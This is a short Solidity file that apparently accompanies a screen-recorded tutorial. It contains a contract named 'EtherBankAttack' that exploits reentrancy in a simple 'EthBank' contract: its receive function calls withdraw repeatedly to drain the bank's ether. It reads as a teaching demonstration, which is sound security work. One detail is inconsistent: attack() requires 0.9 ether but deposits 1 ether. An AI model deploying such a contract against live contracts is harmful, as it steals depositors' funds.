/**
Screen recording: https://youtu.be/44tDtJr0JzA
 */
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.13;
interface IEthBank{
    function deposit() external payable;
    function withdraw() external payable;
}
contract EtherBankAttack{
    IEthBank ethbank;
    receive() external payable{
        if(address(ethbank).balance >= 1 ether){
            ethbank.withdraw();
        }
    }
    constructor(IEthBank _ethbank){
        ethbank = _ethbank;
    }
    function attack() external payable{
        require(msg.value >= 0.9 ether);
        ethbank.deposit{value: 1 ether}();
        ethbank.withdraw();
    }
}